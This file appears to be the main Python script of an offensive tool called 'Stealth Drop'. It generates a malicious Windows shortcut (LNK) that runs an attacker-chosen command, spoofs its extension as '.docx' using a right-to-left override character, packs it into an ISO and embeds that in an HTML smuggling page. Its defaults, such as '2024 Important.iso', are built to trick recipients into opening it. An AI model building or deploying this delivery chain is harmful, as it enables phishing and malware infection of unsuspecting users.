import os
import argparse
from utils import *


def main():
    print(
        """
███████╗████████╗███████╗ █████╗ ██╗  ████████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ ██████╗ 
██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║  ╚══██╔══╝██║  ██║    ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
███████╗   ██║   █████╗  ███████║██║     ██║   ███████║    ██║  ██║██████╔╝██║   ██║██████╔╝
╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║   ██╔══██║    ██║  ██║██╔══██╗██║   ██║██╔═══╝ 
███████║   ██║   ███████╗██║  ██║███████╗██║   ██║  ██║    ██████╔╝██║  ██║╚██████╔╝██║     
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝                                                                                                 
    """
    )
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', help="Command the LNK file will run", required=True)
    parser.add_argument('-ht', '--html_template', help="Path to the HTML template file", required=False, default=os.path.join(os.getcwd(), "templates", "template.html"))
    parser.add_argument('-jt', '--js_template', help="Path to the JS template file", required=False, default=os.path.join(os.getcwd(), "templates", "template.js"))
    parser.add_argument('-if', '--iso_filename', help="Name of the ISO file when downloaded", required=False, default="2024 Important.iso")
    parser.add_argument('-e', '--spoof_extension', help="Spoofed extension for the LNK file", required=False, default=".docx")
    parser.add_argument('-n', '--lnk_name', help="Name of the LNK file to put into the ISO", required=True)
    parser.add_argument('--icon', help="Path to the icon for the LNK file", required=True)
    args = parser.parse_args()
    create_lnk(
        args.lnk_name,
        args.command,
        "Minimized",
        "",
        "",
        args.icon,
        "C:\\Windows\\System32",
        False,
    )
    print("[i] Generated malicious LNK file ...")
    payload_lnk = create_rtlo_file(
        os.path.abspath(args.lnk_name), os.getcwd(), ".docx"
    )
    print("[i] Spoofed extension of LNK file using RTLO ...")
    generate_iso_file(payload_lnk)
    generate_html_payload(
        os.path.join(os.getcwd(), "templates"),
        os.path.join(os.getcwd(), "payload.iso"),
        os.path.join(os.getcwd(), "templates", "template.html"),
        os.path.join(os.getcwd(), "templates", "template.js"),
        output_filename="payload.html",
        download_as_filename="Important.iso",
    )
    print("[i] Cleaning temporary files ...")
    os.remove(payload_lnk)
    os.remove(os.path.join(os.getcwd(), "payload.iso"))
    os.remove(os.path.abspath(args.lnk_name))


if __name__ == "__main__":
    main()
